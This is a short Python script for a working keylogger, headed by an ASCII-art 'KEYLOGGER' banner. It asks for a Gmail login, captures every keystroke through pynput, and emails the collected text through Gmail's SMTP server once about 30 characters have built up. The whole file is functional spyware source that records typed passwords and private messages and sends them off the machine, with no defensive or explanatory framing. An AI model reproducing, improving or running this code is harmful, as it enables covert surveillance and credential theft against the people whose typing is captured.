import getpass
import smtplib
from pynput.keyboard import Key , Listener

print('''
   _     _      _     _      _     _      _     _      _     _      _     _      _     _      _     _      _     _   
  (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)  
   / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \   
 __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__ 
(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)
   || K ||      || E ||      || Y ||      || L ||      || O ||      || G ||      || G ||      || E ||      || R ||   
 _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._ 
(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-`\.-.)
 `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-' 
''')

email = input('Enter email: ') 
password = getpass.getpass(prompt='Password: ', stream=None)
print('CAPTURING.............')
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

log = ''
word = ''
buffcap  = 30
 
def on_press(key):
 	global word
 	global log
 	global email
 	global buffcap
 	
 	if key == Key.space or key == Key.enter:
 		word+=' '
 		log+=word
 		word = ''
 		if len(log) >= buffcap:
 			send_log()
 			log = ''
 	elif key == Key.shift_l or key == Key.shift_r:
 		return
 	elif key == Key.backspace:
 		word = word[:-1]
 	else:
 		char = f'{key}'
 		char = char[1:-1]
 		word +=char
 	if key == Key.esc:
 		return False
 	
def send_log():
 	server.sendmail(email,email,log)
 	
with Listener( on_press=on_press) as listener:
 	listener.join()
 
